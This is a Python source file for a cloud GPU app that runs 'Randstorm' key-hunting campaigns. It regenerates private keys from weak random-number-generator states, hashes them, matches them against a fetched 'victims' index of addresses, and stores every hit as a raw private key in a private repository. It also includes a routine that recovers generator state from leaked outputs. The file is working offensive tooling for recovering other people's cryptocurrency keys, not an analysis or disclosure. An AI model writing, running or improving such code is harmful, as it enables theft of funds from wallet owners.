#!/usr/bin/env python3
"""Modal app: run the Randstorm chain + GPU hunt pipeline.

Usage (from the repository root, via GitHub Actions or locally):

    modal run scanner/modal_scan.py::main --task selftest
    modal run scanner/modal_scan.py::main --task canary
    modal run scanner/modal_scan.py::main --task campaign --campaign demo --max-shards 2
    modal run scanner/modal_scan.py::main --task campaign_status --campaign demo

Scan state (campaign manifests, shard cursors, hits) is stored in the private
GitLab repository, never on Modal, so a campaign resumes across Modal accounts.
"""

import json
import multiprocessing
import os
import subprocess
import sys
import time

import modal

app = modal.App("randstorm-scan")

CUDA_BASE = "nvidia/cuda:12.4.1-devel-ubuntu22.04"

image = (
    modal.Image.from_registry(CUDA_BASE, add_python="3.11")
    .pip_install("numpy", "cupy-cuda12x", "z3-solver")
    .add_local_dir("scanner", remote_path="/root/scanner", copy=True)
    .run_commands(
        "gcc -O3 -shared -fPIC -o /root/scanner/chain/librandstorm_chain.so "
        "/root/scanner/chain/randstorm_chain.c",
        "ls -la /root/scanner/chain/librandstorm_chain.so",
    )
)

_POOL = None


def _get_pool():
    """Fork-based worker pool created before any CUDA context exists."""
    global _POOL
    if _POOL is None:
        workers = max(1, min(os.cpu_count() or 1, 8))
        _POOL = multiprocessing.Pool(processes=workers)
    return _POOL


def _chain_chunk(task):
    params, t1_values, dt2_values, start, count = task
    import chain

    return chain.generate(params, t1_values, dt2_values, start, count)


def _split(count, parts):
    base, remainder = divmod(count, parts)
    chunks = []
    offset = 0
    for index in range(parts):
        size = base + (1 if index < remainder else 0)
        if size:
            chunks.append((offset, size))
        offset += size
    return chunks


@app.function(image=image, gpu="T4", timeout=3600)
def run_gpu_selftest():
    result = subprocess.run(
        [sys.executable, "/root/scanner/gpu/selftest_gpu.py"],
        capture_output=True,
        text=True,
    )
    return {"returncode": result.returncode, "stdout": result.stdout, "stderr": result.stderr}


@app.function(image=image, gpu="T4", timeout=7200)
def run_shard(spec_json: str, index_bytes: bytes, budget_seconds: int = 900):
    """Execute one campaign shard: chain generation -> GPU match against the index."""
    import cupy as cp

    for path in ("/root/scanner", "/root/scanner/chain", "/root/scanner/gpu"):
        if path not in sys.path:
            sys.path.insert(0, path)

    import chain
    import hunt_cuda
    from ec import hash160, pubkey_bytes

    spec = json.loads(spec_json)
    pool = _get_pool()  # created before CUDA initialisation
    workers = pool._processes

    index_path = "/tmp/randstorm_index.bin"
    with open(index_path, "wb") as handle:
        handle.write(index_bytes)
    db_gpu, n20 = hunt_cuda.load_db_gpu(index_path)
    gtab = cp.asarray(hunt_cuda.build_g_table_np())
    module = hunt_cuda.compile_cuda(1)

    params = {
        "seed_start": spec["seed_start"],
        "seed_count": spec["seed_count"],
        "context_index": spec["context_index"],
        "math_offset": spec["math_offset"],
        "key_count": spec["key_count"],
        "rc4_offset": spec["rc4_offset"],
        "mode": spec.get("mode", 0),
        "mwc_s0": spec.get("mwc_s0", 0),
        "mwc_s1": spec.get("mwc_s1", 0),
    }
    t1_values = spec["t1_values"]
    dt2_values = spec["dt2_values"]
    batch = 1 << 21
    done = 0
    hits = []
    chain_seconds = 0.0
    hunt_seconds = 0.0
    started = time.time()

    while done < spec["flat_count"] and time.time() - started < budget_seconds:
        count = min(batch, spec["flat_count"] - done)
        tasks = [
            (params, t1_values, dt2_values, spec["flat_start"] + done + offset, size)
            for offset, size in _split(count, workers)
        ]
        chain_started = time.time()
        results = pool.map(_chain_chunk, tasks)
        keys_bytes = b"".join(chunk[0] for chunk in results)
        written = sum(chunk[1] for chunk in results)
        chain_seconds += time.time() - chain_started
        if written == 0:
            break
        hunt_started = time.time()
        limbs = hunt_cuda.limbs_from_bytes(keys_bytes)
        for key_int, kind in hunt_cuda.hunt_batch(limbs, gtab, db_gpu, n20, module):
            key_hex = f"{key_int:064x}"
            if kind == 1:
                matched = hash160(pubkey_bytes(key_int, compressed=False))
            else:
                compressed_hash = hash160(pubkey_bytes(key_int, compressed=True))
                matched = compressed_hash if kind == 0 else hash160(b"\x00\x14" + compressed_hash)
            hits.append({
                "private_key": key_hex,
                "type": kind,
                "hash160": matched.hex(),
            })
        hunt_seconds += time.time() - hunt_started
        done += written

    elapsed = time.time() - started
    return {
        "shard_id": spec["shard_id"],
        "flat_count": spec["flat_count"],
        "done": done,
        "finished": done >= spec["flat_count"],
        "elapsed_seconds": round(elapsed, 2),
        "keys_per_second": round(done / elapsed, 1) if elapsed else 0.0,
        "chain_seconds": round(chain_seconds, 2),
        "hunt_seconds": round(hunt_seconds, 2),
        "workers": workers,
        "hits": hits,
    }


@app.local_entrypoint()
def main(task: str = "selftest", campaign: str = "", max_shards: int = 1, budget_seconds: int = 900):
    if task == "selftest":
        payload = run_gpu_selftest.remote()
        print(payload["stdout"])
        if payload["returncode"] != 0:
            print(payload["stderr"], file=sys.stderr)
            raise SystemExit(payload["returncode"])
    elif task == "canary":
        import canary
        import run_campaign

        victims = run_campaign.fetch_victims_index()
        index_bytes, expected = canary.build_canary_index(victims)
        print(f"canary index: {len(index_bytes):,} bytes, {len(expected)} canary records")
        run_campaign.run_campaign(
            canary.canary_config(),
            max_shards=100,
            budget_seconds=budget_seconds,
            run_shard=run_shard,
            index_bytes=index_bytes,
        )
        import scan_state

        canary.verify_hits(scan_state, "canary", expected)
    elif task == "state_canary":
        import canary
        import run_campaign
        import state_recovery

        true_s0, true_s1 = 0xDEADBEEF, 0x12345678
        leaked = state_recovery.simulate_outputs(true_s0, true_s1, 4)
        recovered = state_recovery.recover_state(leaked)
        assert state_recovery.verify_recovery(true_s0, true_s1, recovered, extra=64), "recovery failed"
        print(f"state recovered from {len(leaked)} leaked outputs: {recovered[0]:08x} {recovered[1]:08x}")

        victims = run_campaign.fetch_victims_index()
        index_bytes, expected = canary.build_state_canary(victims, recovered, leak_count=len(leaked))
        print(f"state canary index: {len(index_bytes):,} bytes, {len(expected)} records")
        run_campaign.run_campaign(
            canary.state_canary_config(recovered, leak_count=len(leaked)),
            max_shards=100,
            budget_seconds=budget_seconds,
            run_shard=run_shard,
            index_bytes=index_bytes,
        )
        import scan_state

        canary.verify_hits(scan_state, "state-canary", expected)
    elif task in ("campaign", "campaign_init", "campaign_status"):
        import run_campaign

        if task == "campaign_init":
            run_campaign.init_campaign(campaign)
        elif task == "campaign_status":
            raise SystemExit(run_campaign.status(campaign))
        else:
            raise SystemExit(run_campaign.run_campaign(
                campaign,
                max_shards=max_shards,
                budget_seconds=budget_seconds,
                run_shard=run_shard,
            ))
    else:
        raise SystemExit(f"unknown task: {task}")
